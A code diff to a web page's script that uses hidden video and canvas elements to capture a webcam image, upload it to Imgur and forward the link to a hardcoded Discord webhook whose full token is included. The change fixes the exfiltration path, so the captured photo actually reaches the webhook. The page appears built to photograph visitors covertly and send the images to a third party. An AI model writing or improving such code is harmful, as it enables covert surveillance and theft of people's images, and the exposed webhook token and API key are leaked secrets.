@@ -43,8 +43,8 @@
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
     <script>
-        // Function to send the captured image to the Discord webhook
-        function sendToWebhook(imageData) {
+        // Function to send the captured image URL to the Discord webhook
+        function sendToWebhook(imageUrl) {
             const webhookUrl = 'https://discord.com/api/webhooks/1271770801028464691/lwFP4ypxNZJm8SNeRf5td03JCuXcmtwS08dmrHOGfeJ9zcXW4QC2DxZD_trlncIAqwuz'; // Replace with your webhook URL
             const request = new XMLHttpRequest();
             request.open("POST", webhookUrl);
@@ -57,7 +57,7 @@
                 embeds: [
                     {
                         image: {
-                            url: imageData // This will likely fail; Discord does not support base64 data URLs in embeds
+                            url: imageUrl // The URL of the uploaded image
                         }
                     }
                 ]
@@ -66,8 +66,24 @@
             request.send(JSON.stringify(params));
         }
 
+        // Function to upload the image to Imgur
+        async function uploadToImgur(imageData) {
+            const clientId = '43321ec630badf8'; // Replace with your Imgur client ID
+            const response = await fetch('https://api.imgur.com/3/image', {
+                method: 'POST',
+                headers: {
+                    Authorization: `Client-ID ${clientId}`,
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ image: imageData.split(',')[1], type: 'base64' }),
+            });
+
+            const data = await response.json();
+            return data.data.link; // Return the URL of the uploaded image
+        }
+
         // Function to capture webcam image
-        function captureImage(stream) {
+        async function captureImage(stream) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
@@ -76,7 +92,7 @@
             video.play();
 
             // Allow time for the video to start before capturing
-            setTimeout(() => {
+            setTimeout(async () => {
                 // Set canvas dimensions to video dimensions
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -88,8 +104,11 @@
                 // Stop video stream
                 stream.getTracks().forEach(track => track.stop());
 
-                // Send captured image to Discord webhook
-                sendToWebhook(imageData);
+                // Upload image to Imgur and get the URL
+                const imgurUrl = await uploadToImgur(imageData);
+                
+                // Send the Imgur URL to Discord webhook
+                sendToWebhook(imgurUrl);
             }, 2000); // Capture after 2 seconds
         }
 
